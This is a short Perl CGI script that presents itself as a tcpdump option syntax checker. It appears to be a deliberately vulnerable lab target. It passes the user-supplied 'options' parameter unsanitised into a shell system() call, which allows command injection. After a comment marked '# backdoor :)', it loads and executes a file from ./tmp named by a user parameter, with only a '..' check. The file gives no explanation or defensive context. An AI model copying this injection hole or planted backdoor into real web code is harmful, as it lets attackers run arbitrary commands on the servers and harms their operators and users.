#!/usr/bin/perl
use lib '/var/www/html/';
use strict;

use CGI ();
use DSSafe;


sub tcpdump_options_syntax_check {
    my $options = shift;
    return $options if system("timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/null 2>&1") == 0;
    return undef;
}
 
print "Content-type: text/html\n\n";
 
my $options = CGI::param("options");
my $output = tcpdump_options_syntax_check($options);
 

# backdoor :)
my $tpl = CGI::param("tpl");
if (length $tpl > 0 && index($tpl, "..") == -1) {
    $tpl = "./tmp/" . $tpl . ".thtml";
    require($tpl);
}